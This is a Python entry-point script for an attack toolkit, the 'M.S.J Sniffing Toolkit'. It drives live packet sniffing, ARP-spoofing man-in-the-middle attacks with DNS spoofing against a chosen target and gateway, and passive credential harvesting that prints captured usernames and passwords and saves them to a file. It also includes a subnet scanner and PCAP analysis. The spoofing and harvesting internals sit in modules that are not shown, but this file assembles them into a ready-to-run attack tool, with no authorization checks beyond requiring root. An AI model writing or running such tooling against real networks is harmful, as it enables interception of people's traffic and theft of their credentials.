#!/usr/bin/env python3
"""
M.S.J SNIFFING TOOLKIT  v3.2.0
Maximum Ability Network Traffic Analysis Suite
Creator: M.S.J

Usage:
    python3 main.py [mode] [options]

Modes:
    live        Live packet capture with TUI
    mitm        ARP spoofing MITM attack
    offline     Analyze saved PCAP file
    harvest     Passive credential harvesting
    scan        Network scan / reconnaissance
"""

import sys
import os
import time
import signal
import argparse
import threading
import traceback
import subprocess
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import pyfiglet
import netifaces
from scapy.all import get_if_hwaddr, arping
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import box
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.align import Align
from rich.style import Style

from modules import __version__, __creator__
from modules.capture import CaptureEngine
from modules.dissect import dissect_packet
from modules.filter import PacketFilter
from modules.export import (
    PCAPExporter, JSONExporter, CSVExporter,
    HexDumpExporter, TXTLogExporter, MultiExporter
)
from modules.display import SnifferDisplay, PacketPrinter, PROTOCOL_STYLES
from modules.analyze import (
    TCPStreamFollower, ConversationTracker,
    BandwidthMonitor, AnomalyDetector
)
from modules.creds import CredentialHarvester, Credential
from modules.mitm import (
    MITMConfig, ARPSpoofer, DNSSpoofer, ConnectionHijacker
)
from modules.menu import MenuHUD
from modules.iface import InterfaceDiscovery, list_interfaces, rich_iface_table

# ─── Pyfiglet ─────────────────────────────────────────────────
BANNER_FONT  = 'standard'   # compact: 5-6 lines
MODE_FONT    = 'small'      # compact mode header

MODE_COLORS = {
    'live': 'bright_green', 'mitm': 'bright_red',
    'offline': 'bright_yellow', 'harvest': 'bright_magenta',
    'scan': 'bright_blue', 'test': 'bright_cyan',
}


def _fig(text: str, font: str = BANNER_FONT, width: int = 100) -> str:
    try:
        return pyfiglet.figlet_format(text, font=font, width=width).rstrip('\n')
    except Exception:
        return '=' * 50 + '\n  ' + text.upper() + '\n' + '=' * 50


def _banner(console: Console, color: str = 'bright_cyan') -> None:
    """Compact pyfiglet banner — single panel, standard font."""
    art = _fig('M . S . J', font=BANNER_FONT, width=console.width or 90)
    content = Text()
    content.append(art, style=f'bold {color}')
    content.append(f'\n  v{__version__} · {__creator__} · "See the wires, hear the whispers"\n',
                   style='bright_yellow')
    console.print(Panel(Align.center(content), border_style=color,
                         box=box.ROUNDED, padding=(0, 2)))


def _mode_title(console: Console, mode: str, label: str) -> None:
    """Compact mode header."""
    color = MODE_COLORS.get(mode, 'bright_cyan')
    art = _fig(label.upper(), font=MODE_FONT, width=console.width or 90)
    console.print(Panel(Align.center(Text(art, style=f'bold {color}')),
                         border_style=color, box=box.ROUNDED, padding=(0, 1)))


# ─── CLI ──────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description='M.S.J Sniffing Toolkit v' + __version__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'Creator: {__creator__}')
    p.add_argument('mode', nargs='?', default=None,
                   choices=['menu','live','mitm','offline','harvest','scan','test'],
                   help='Operation mode (default: menu)')
    p.add_argument('--menu', action='store_true', help='Launch menu HUD')
    p.add_argument('-i','--interface', default=None, help='Network interface')
    p.add_argument('-f','--filter', default=None, help='BPF filter')
    p.add_argument('-o','--output', default='msj_capture', help='Output prefix')
    p.add_argument('-t','--target', default=None, help='Target IP (MITM)')
    p.add_argument('-g','--gateway', default=None, help='Gateway IP (MITM)')
    p.add_argument('-d','--dns-spoof', default=None, help='DNS spoof table')
    p.add_argument('-p','--pcap', default=None, help='PCAP file path')
    p.add_argument('--backend', default='scapy', choices=['scapy','raw'])
    p.add_argument('--no-promisc', action='store_true')
    p.add_argument('--timeout', type=int, default=0)
    p.add_argument('--packets', type=int, default=0)
    p.add_argument('--export-pcap', default=None)
    p.add_argument('--export-json', default=None)
    p.add_argument('--export-csv', default=None)
    p.add_argument('--export-hex', default=None)
    p.add_argument('--export-log', default=None)
    p.add_argument('--export-all', default=None)
    p.add_argument('--no-color', action='store_true')
    p.add_argument('--output-dir', default='.')
    p.add_argument('--list-if', action='store_true', help='List all network interfaces with details')
    p.add_argument('--iface-detail', default=None, help='Show detailed info for a specific interface')
    return p


# ─── Export Helpers ───────────────────────────────────────────
def _open_x(exp): 
    if exp and hasattr(exp, 'open'): exp.open()
def _close_x(exp):
    if exp and hasattr(exp, 'close'): exp.close()

def _setup_exporters(args) -> Optional[MultiExporter]:
    d = args.output_dir or '.'; os.makedirs(d, exist_ok=True)
    m = MultiExporter(); any_ = False
    if args.export_pcap:   m.add(PCAPExporter(args.export_pcap)); any_ = True
    if args.export_json:   m.add(JSONExporter(args.export_json)); any_ = True
    if args.export_csv:    m.add(CSVExporter(args.export_csv));   any_ = True
    if args.export_hex:    m.add(HexDumpExporter(args.export_hex)); any_ = True
    if args.export_log:    m.add(TXTLogExporter(args.export_log)); any_ = True
    if args.export_all:
        p = args.export_all
        for cls, ext in [(PCAPExporter,'.pcap'),(JSONExporter,'.json'),(CSVExporter,'.csv'),
                          (HexDumpExporter,'.hex'),(TXTLogExporter,'.log')]:
            m.add(cls(f'{d}/{p}{ext}'))
        any_ = True
    if args.output and not any_:
        p = f'{d}/{args.output}'
        m.add(PCAPExporter(f'{p}.pcap')); m.add(JSONExporter(f'{p}.json')); m.add(CSVExporter(f'{p}.csv'))
        any_ = True
    return m if any_ else None


# ─── Mode: LIVE ───────────────────────────────────────────────
def mode_live(args):
    c = Console(); _banner(c, 'bright_green')
    try:
        engine = CaptureEngine(interface=args.interface, backend=args.backend,
                               filter_bpf=args.filter, promisc=not args.no_promisc)
    except PermissionError as e:
        c.print(Panel(f'[red bold]Permission denied[/]\n[grey70]{e}[/]', border_style='red'))
        return
    display = SnifferDisplay(console=c)
    exporters = _setup_exporters(args); _open_x(exporters)
    stop = threading.Event(); limit = args.packets

    engine.callback = lambda pkt, info: _handle_pkt(pkt, info, display, exporters, limit, stop, engine)
    try:
        engine.start()
    except PermissionError as e:
        c.print(Panel(f'[red bold]Permission denied[/]\n[grey70]{e}[/]', border_style='red'))
        _close_x(exporters)
        return

    signal.signal(signal.SIGINT, lambda *a: stop.set())
    signal.signal(signal.SIGTERM, lambda *a: stop.set())
    time.sleep(0.5)
    display.engine_stats = engine.stats
    try: display.run(stop_event=stop)
    except KeyboardInterrupt: stop.set()
    engine.stop(); display.stop(); _close_x(exporters)
    _stats(c, engine); _creds(c, display.cred_harvester)


def _handle_pkt(pkt, info, display, exporters, limit, stop, engine):
    if stop.is_set(): return
    if info: display.add_packet(pkt, info)
    if exporters:
        try: exporters.write(pkt, info)
        except: pass
    if limit > 0 and engine.packet_count >= limit: stop.set()


# ─── Mode: MITM ───────────────────────────────────────────────
def mode_mitm(args):
    c = Console(); _banner(c, 'bright_red')
    if not args.target or not args.gateway:
        c.print(Panel('[red bold]MITM needs --target and --gateway[/]', border_style='red')); sys.exit(1)
    if os.geteuid() != 0:
        c.print(Panel('[red bold]MITM needs root. Use sudo.[/]', border_style='red')); sys.exit(1)
    iface = args.interface
    if not iface:
        try:
            disc = InterfaceDiscovery()
            iface = disc.default_interface() or 'eth0'
        except Exception:
            iface = 'eth0'

    dns_tbl = {}
    if args.dns_spoof:
        for e in args.dns_spoof.split(','):
            if '=' in e: a,b = e.split('=',1); dns_tbl[a.strip()] = b.strip()

    # Config panel
    t = Table.grid(padding=(0,1)); t.add_column(style='cyan'); t.add_column(style='yellow')
    t.add_row('Interface', iface); t.add_row('Target', args.target); t.add_row('Gateway', args.gateway)
    if dns_tbl:
        t.add_row('DNS Spoof', f'{len(dns_tbl)} rules')
        for dom, ip in dns_tbl.items(): t.add_row('', f'  {dom} → {ip}')
    c.print(Panel(t, title='[red]MITM Config[/]', border_style='bright_red', box=box.ROUNDED))

    engine = CaptureEngine(interface=iface, backend='scapy', filter_bpf='tcp or udp or arp', promisc=True)
    config = MITMConfig(interface=iface, target_ip=args.target, gateway_ip=args.gateway, 
                         verbose=True, packet_forwarding=True)

    c.print('[yellow][*] Starting ARP spoofing...[/]')
    arp = ARPSpoofer(config)
    try: arp.start()
    except RuntimeError as e:
        c.print(f'[red][!] ARP spoof failed: {e}[/]'); sys.exit(1)

    dns_s = None
    if dns_tbl:
        c.print('[yellow][*] Starting DNS spoofing...[/]')
        dns_s = DNSSpoofer(spoof_table=dns_tbl); dns_s.start(interface=iface)

    harv = CredentialHarvester()
    def on_c(cred): c.print(f'[red bold]  [!] {cred}[/]')
    harv.on_credential(on_c)

    c.print(Panel('[green bold]MITM active. Ctrl+C to stop & restore ARP[/]',
                  border_style='green', box=box.ROUNDED))

    display = SnifferDisplay(console=c)
    display.mitm_active = True; display.mitm_target = args.target; display.mitm_gateway = args.gateway
    def handler(pkt, info):
        if info: display.add_packet(pkt, info); harv.analyze(info)
        display.mitm_packets_spoofed = arp.get_stats().get('packets_spoofed',0)
    engine.callback = handler; engine.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: pass

    c.print('\n[yellow][*] Shutting down MITM...[/]')
    engine.stop(); arp.stop()
    if dns_s: dns_s.stop()
    _creds(c, harv)


# ─── Mode: OFFLINE ────────────────────────────────────────────
def mode_offline(args):
    c = Console(); _banner(c, 'bright_yellow')
    if not args.pcap:
        c.print(Panel('[red]--pcap required[/]', border_style='red')); sys.exit(1)
    if not os.path.exists(args.pcap):
        c.print(Panel(f'[red]File not found: {args.pcap}[/]', border_style='red')); sys.exit(1)

    c.print(f'[cyan]Reading [yellow]{args.pcap}[/]')
    with Progress(SpinnerColumn(), TextColumn('{task.description}'), console=c, transient=True) as prog:
        task = prog.add_task('Loading...', total=None)
        engine = CaptureEngine(); pkts = engine.read_pcap(args.pcap)
        prog.update(task, completed=True)

    c.print(f'[green]+ Loaded [bold]{len(pkts)}[/] packets\n')
    stats = engine.get_stats()

    # Summary table
    tbl = Table(title='Capture Summary', box=box.ROUNDED, border_style='yellow')
    tbl.add_column('Metric', style='cyan'); tbl.add_column('Value', style='white')
    for k,v in stats.items():
        if isinstance(v,(int,float,str)) and not k.startswith('_'):
            tbl.add_row(str(k), str(v))
    c.print(tbl)
    c.print()

    # TCP streams
    follower = TCPStreamFollower()
    for p in pkts:
        info = dissect_packet(p)
        if info: follower.feed(p, info)
    ss = follower.stats()
    stbl = Table(title='TCP Streams', box=box.ROUNDED, border_style='yellow')
    stbl.add_column('Metric', style='cyan'); stbl.add_column('Value', style='white')
    for k,v in [('Total',ss['total_streams']),('Completed',ss['completed']),('Active',ss['active'])]:
        stbl.add_row(k, str(v))
    c.print(stbl)
    c.print()

    # HTTP
    http = [s for s in follower.get_completed_streams() if s.protocol == 'HTTP']
    if http:
        htbl = Table(title=f'HTTP Streams ({len(http)})', box=box.ROUNDED, border_style='yellow')
        htbl.add_column('ID', style='cyan'); htbl.add_column('Source', style='yellow')
        htbl.add_column('Dest', style='yellow'); htbl.add_column('Request', style='green')
        for s in http[:10]:
            rl = ''
            if s.client_data:
                try: rl = s.client_data.split(b'\r\n')[0].decode('utf-8','replace')
                except: rl = '(binary)'
            htbl.add_row(str(s.stream_id), f'{s.src_ip}:{s.src_port}', f'{s.dst_ip}:{s.dst_port}', rl[:60])
        c.print(htbl)
        c.print()

    # Conversations
    convo = ConversationTracker()
    for p in pkts:
        info = dissect_packet(p)
        if info: convo.feed(info)
    c.print(Panel(convo.summary(), title='Conversations', border_style='yellow', box=box.ROUNDED))
    c.print()

    # Creds
    harv = CredentialHarvester()
    for p in pkts:
        info = dissect_packet(p)
        if info: harv.analyze(info)
    _creds(c, harv)

    # Export
    if any([args.export_pcap, args.export_json, args.export_csv, args.export_hex, args.export_log, args.export_all]):
        exporters = _setup_exporters(args); _open_x(exporters)
        for p in pkts:
            info = dissect_packet(p)
            if exporters: exporters.write(p, info)
        _close_x(exporters)
        c.print(Panel(f'[green]✓ Exported → {args.output}.*[/]', border_style='green'))


# ─── Mode: HARVEST ────────────────────────────────────────────
def mode_harvest(args):
    c = Console(); _banner(c, 'bright_magenta')
    if os.geteuid() != 0:
        c.print(Panel('[yellow]Non-root — limited capture[/]', border_style='yellow'))

    engine = CaptureEngine(interface=args.interface, backend=args.backend,
                           filter_bpf=args.filter or 'tcp or udp', promisc=not args.no_promisc)
    harv = CredentialHarvester()
    fout = None
    if args.output:
        fn = f'{args.output}_creds.txt'
        fout = open(fn, 'w'); fout.write(f'M.S.J Cred Harvest — {datetime.now()}\n'+'='*60+'\n')
    def on_cred(cred):
        ln = str(cred); c.print(f'[red bold]{ln}[/]')
        if fout: fout.write(ln+'\n'); fout.flush()
    harv.on_credential(on_cred)

    def handler(pkt, info):
        if info: harv.analyze(info)
    engine.callback = handler

    c.print(Panel(f'[green]Harvesting on [yellow]{engine.interface}[/]\n[grey50]Ctrl+C to stop[/]',
                  border_style='bright_magenta', box=box.ROUNDED))
    engine.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: pass
    engine.stop()
    _creds(c, harv)
    if fout:
        fout.close()
        c.print(Panel(f'[green]✓ Saved → {fn}[/]', border_style='green'))


# ─── Mode: SCAN ───────────────────────────────────────────────
def _parse_arp_cache() -> list:
    """Parse /proc/net/arp for passive host discovery. Returns list of (ip, mac) tuples."""
    hosts = []
    try:
        with open('/proc/net/arp', 'r') as f:
            lines = f.readlines()
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 6:
                ip = parts[0]
                hw_type = parts[1]
                flags = parts[2]
                mac = parts[3]
                iface = parts[5]
                if '0x2' in flags or '0x6' in flags:
                    hosts.append((ip, mac, iface))
    except Exception:
        pass
    return hosts

def _tcp_probe(ip: str, ports: tuple = (80, 443, 22, 8080, 445, 139), timeout: float = 0.15) -> bool:
    """Quick TCP connect scan to common ports."""
    import socket
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((ip, port))
            s.close()
            if r == 0:
                return True
        except Exception:
            pass
    return False

def _ping_probe(ip: str, timeout: float = 1.0) -> bool:
    """ICMP ping probe."""
    try:
        r = subprocess.run(
            ['ping', '-c', '1', '-W', '1', ip],
            capture_output=True, text=True, timeout=timeout + 0.5
        )
        return r.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return False

def _ping_sweep(network: str, max_workers: int = 120, verbose_cb=None) -> list:
    """Two-phase sweep: TCP first (fast), ICMP ping for non-responders."""
    alive = set()
    try:
        net = ipaddress.ip_network(network, strict=False)
        ips = [str(ip) for ip in net.hosts()]
        total = len(ips)
        scanned = 0

        # Phase 1: Fast TCP connect scan
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_tcp_probe, ip): ip for ip in ips}
            for future in as_completed(futures):
                scanned += 1
                ip = futures[future]
                try:
                    if future.result():
                        alive.add(ip)
                except Exception:
                    pass
                if verbose_cb and scanned % 100 == 0:
                    verbose_cb(scanned, total, len(alive), 'TCP')

        # Phase 2: Ping the TCP-negative hosts (slower, fewer hosts)
        remaining = [ip for ip in ips if ip not in alive]
        if remaining and len(remaining) < 500:
            scanned2 = 0
            with ThreadPoolExecutor(max_workers=60) as executor:
                futures = {executor.submit(_ping_probe, ip): ip for ip in remaining}
                for future in as_completed(futures):
                    scanned2 += 1
                    ip = futures[future]
                    try:
                        if future.result():
                            alive.add(ip)
                    except Exception:
                        pass
                    if verbose_cb and scanned2 % 50 == 0:
                        verbose_cb(scanned2, len(remaining), len(alive), 'ICMP')
    except ValueError:
        pass
    return [(ip, None) for ip in sorted(alive, key=lambda x: ipaddress.IPv4Address(x))]

def mode_scan(args):
    c = Console(); _banner(c, 'bright_blue')
    iface = args.interface
    if not iface:
        try:
            disc = InterfaceDiscovery()
            iface = disc.default_interface() or 'eth0'
        except Exception:
            iface = 'eth0'
    _mode_title(c, 'scan', 'NETWORK SCAN')
    try:
        addrs = netifaces.ifaddresses(iface)
        ip_i = addrs.get(netifaces.AF_INET, [{}])[0]
        lip = ip_i.get('addr','?'); nm = ip_i.get('netmask','?'); mac = get_if_hwaddr(iface)

        t = Table.grid(padding=(0,1)); t.add_column(style='cyan'); t.add_column(style='white')
        t.add_row('Interface', iface); t.add_row('MAC', mac); t.add_row('IP', lip); t.add_row('Netmask', nm)
        c.print(Panel(t, title='Interface Info', border_style='bright_blue', box=box.ROUNDED))
        c.print()

        if lip != '?' and nm != '?':
            ip_p = lip.split('.'); nm_p = nm.split('.')
            net = '.'.join(str(int(ip_p[i])&int(nm_p[i])) for i in range(4))
            cidr = sum(bin(int(x)).count('1') for x in nm_p)
            nc = f'{net}/{cidr}'
            c.print(Panel(f'[cyan]Network:[/] [yellow bold]{nc}[/]', border_style='bright_blue', box=box.ROUNDED))
            c.print()

            # Phase 1: Passive ARP cache read (always runs, silent)
            arp_hosts = _parse_arp_cache()

            # Guard against excessively large networks (cellular /8, large WAN ranges)
            if cidr < 16:
                c.print(Panel(
                    f'[yellow]⚠ Network [bold]{nc}[/] is very large ({2**(32-cidr):,} hosts).\n'
                    f'  ARP/ping scanning a /{cidr} is impractical.\n'
                    f'  Use a smaller target range with --target or specify a /24.[/]',
                    border_style='yellow', box=box.ROUNDED
                ))
                # Still show passive ARP cache results if any
                if arp_hosts:
                    ht = Table(title=f'ARP Cache ({iface})', box=box.ROUNDED, border_style='bright_blue')
                    ht.add_column('#', style='grey50')
                    ht.add_column('IP', style='cyan bold')
                    ht.add_column('MAC', style='yellow')
                    ht.add_column('Device', style='grey50')
                    for i, (ip_addr, mac_addr, src_iface) in enumerate(arp_hosts, 1):
                        ht.add_row(str(i), ip_addr, mac_addr, src_iface)
                    c.print(ht)
                return

            # Phase 2: Try active ARP scan (needs raw sockets / root capabilities)
            ans = None; arp_ok = False
            try:
                c.print(f'[yellow][*] ARP scanning [bold]{nc}[/]...')
                ans, _ = arping(nc, timeout=3, verbose=False)
                arp_ok = True
            except PermissionError:
                c.print('[yellow][!] No raw socket access — falling back to ping sweep[/]')
            except OSError as e:
                if 'Operation not permitted' in str(e) or 'Permission' in str(e):
                    c.print('[yellow][!] No raw socket access — falling back to ping sweep[/]')
                else:
                    c.print(f'[yellow][!] ARP scan failed ({e}) — falling back to ping sweep[/]')
            except Exception as e:
                c.print(f'[yellow][!] ARP scan failed ({e}) — falling back to ping sweep[/]')

            # Phase 3: Ping sweep fallback
            ping_hosts = []
            if not arp_ok:
                c.print(f'[yellow][*] Probing [bold]{nc}[/] (TCP + ICMP)...[/]')
                def progress(scanned, total, found, phase='TCP'):
                    pct = scanned/total*100 if total > 0 else 0
                    c.print(f'  [grey50][{phase}] {scanned}/{total} ({pct:.0f}%), {found} alive...[/]')
                ping_hosts = _ping_sweep(nc, verbose_cb=progress if c.width else None)
                c.print(f'[grey50]  Done. {len(ping_hosts)} hosts discovered.[/]')

            # Phase 4: Merge results (ARP answers + passive cache + ping sweep)
            host_map = {}  # ip -> mac

            # ARP active results (most reliable, has MACs)
            if ans and arp_ok:
                for _, r in ans:
                    host_map[r.psrc] = r.hwsrc

            # ARP passive cache
            for ip_addr, mac_addr, src_iface in arp_hosts:
                if ip_addr not in host_map:
                    host_map[ip_addr] = mac_addr

            # Ping sweep (no MAC available, mark as '?')
            for ip_addr, _ in ping_hosts:
                if ip_addr not in host_map:
                    host_map[ip_addr] = '?'

            # Display results
            if host_map:
                ht = Table(title='Live Hosts', box=box.ROUNDED, border_style='bright_blue')
                ht.add_column('#', style='grey50')
                ht.add_column('IP', style='cyan bold')
                ht.add_column('MAC', style='yellow')
                ht.add_column('Source', style='grey50')
                for i, (ip_addr, mac_addr) in enumerate(sorted(host_map.items(), key=lambda x: ipaddress.IPv4Address(x[0])), 1):
                    source = 'arp' if mac_addr and mac_addr != '?' else 'ping'
                    if ip_addr in [h[0] for h in arp_hosts]:
                        source += '+cache'
                    ht.add_row(str(i), ip_addr, mac_addr if mac_addr else '?', source)
                c.print(ht)
                c.print(Panel(f'[green]✓ {len(host_map)} hosts discovered[/]', border_style='green'))
            else:
                c.print(Panel('[grey50]No hosts discovered[/]', border_style='grey50'))

            # Show passive ARP cache summary
            if arp_hosts:
                c.print()
                c.print(Panel(
                    f'[grey70]ARP cache: {len(arp_hosts)} entries (passive)[/]',
                    border_style='grey50', box=box.ROUNDED
                ))

    except ImportError as e:
        c.print(Panel(f'[red]Missing deps: {e}[/]', border_style='red'))
    except Exception as e:
        c.print(Panel(f'[red]Scan error: {e}[/]', border_style='red'))


# ─── Stats & Creds ────────────────────────────────────────────
def _stats(console, engine):
    s = engine.get_stats()
    console.print(); tbl = Table(title='Capture Complete', box=box.ROUNDED, border_style='bright_cyan')
    tbl.add_column('Metric', style='cyan'); tbl.add_column('Value', style='white bold')
    for k,v in [('Packets',s['total']),('Bytes',f"{s['bytes']:,}"),
                ('Interface',s['interface']),('Duration',f"{s['uptime']:.1f}s")]:
        tbl.add_row(k, str(v))
    console.print(tbl)
    # Protocol breakdown
    rows = []
    for proto in ['TCP','UDP','HTTP','DNS','ARP','ICMP','TLS','DHCP']:
        cnt = s.get(proto.lower(),0)
        if cnt > 0:
            pct = cnt/s['total']*100 if s['total'] else 0
            rows.append((proto, cnt, pct))
    if rows:
        pt = Table(title='Protocols', box=box.ROUNDED, border_style='bright_cyan')
        pt.add_column('Proto', style='cyan'); pt.add_column('Count', style='white'); pt.add_column('%', style='yellow')
        for proto,cnt,pct in rows: pt.add_row(proto, str(cnt), f'{pct:.1f}%')
        console.print(pt)


def _creds(console, harv):
    creds = harv.get_creds(); stats = harv.get_stats()
    if creds:
        console.print()
        ct = Table(title=f'Credentials ({len(creds)})', box=box.ROUNDED,
                    border_style='red', title_style='bold red')
        ct.add_column('#', style='grey50'); ct.add_column('Type', style='red bold'); ct.add_column('Details', style='yellow')
        for i,cr in enumerate(creds[-20:],1):
            detail = ''
            if cr.hostname: detail += f'[{cr.hostname}] '
            if cr.username: detail += f'{cr.username}'
            if cr.password: detail += f':{cr.password}'
            if not detail and cr.raw_data: detail = cr.raw_data[:80]
            ct.add_row(str(i), cr.type, detail)
        console.print(ct)
        types = ', '.join(f'{k}={v}' for k,v in stats.items() if v>0 and k!='total')
        console.print(Panel(f'Total: [red bold]{len(creds)}[/]  |  {types}', border_style='red', box=box.ROUNDED))
    else:
        console.print(Panel('[grey50]No credentials captured[/]', border_style='grey50'))


# ─── Mode: TEST ───────────────────────────────────────────────
def mode_test(args):
    c = Console(); _banner(c, 'bright_cyan')
    MenuHUD(c).tools_test()


mode_map = {
    'live': mode_live, 'mitm': mode_mitm, 'offline': mode_offline,
    'harvest': mode_harvest, 'scan': mode_scan, 'test': mode_test,
}


# ─── Entry ────────────────────────────────────────────────────
def main():
    parser = build_parser(); args = parser.parse_args()

    # ── Interface listing (short-circuit) ──
    if args.list_if or args.iface_detail:
        list_interfaces(console=Console(), detail=args.iface_detail)
        sys.exit(0)

    if args.mode is None or args.mode == 'menu' or args.menu:
        c = Console(); hud = MenuHUD(c); hud.show_splash(0.5)
        while True:
            mode = hud.main_menu()
            if mode is None:
                art = _fig('GOODBYE', font=MODE_FONT, width=c.width or 80)
                c.print(Panel(Align.center(Text(art, style='bold bright_cyan')),
                             border_style='bright_cyan', box=box.ROUNDED))
                sys.exit(0)
            cfg = hud.configure_mode(mode)
            if cfg.get('_cancel'): continue
            # Fresh namespace per mode — prevents config from leaking across invocations
            mode_args = argparse.Namespace()
            for k, v in vars(parser.parse_args([])).items():
                setattr(mode_args, k, v)
            for k, v in cfg.items():
                if v is not None: setattr(mode_args, k, v)
            mode_args.mode = mode
            fn = mode_map.get(mode)
            if fn:
                try:
                    fn(mode_args)
                except PermissionError as e:
                    c.print(Panel(f'[red bold]Permission denied[/]\n[grey70]{e}[/]', border_style='red'))
            c.print()
            if not Confirm.ask('[cyan]Return to menu?[/]', default=True):
                art = _fig('GOODBYE', font=MODE_FONT, width=c.width or 80)
                c.print(Panel(Align.center(Text(art, style='bold bright_cyan')),
                             border_style='bright_cyan', box=box.ROUNDED))
                sys.exit(0)
    else:
        try:
            fn = mode_map.get(args.mode)
            if fn: fn(args)
            else: parser.print_help(); sys.exit(1)
        except KeyboardInterrupt:
            Console().print(Panel('[yellow]Interrupted by user[/]', border_style='yellow'))
        except PermissionError as e:
            Console().print(Panel(f'[red]Permission denied: {e}\n  Use sudo for raw capture[/]', border_style='red'))
            sys.exit(1)
        except Exception as e:
            Console().print(Panel(f'[red]Error: {e}[/]', border_style='red'))
            traceback.print_exc(); sys.exit(1)


if __name__ == '__main__':
    main()
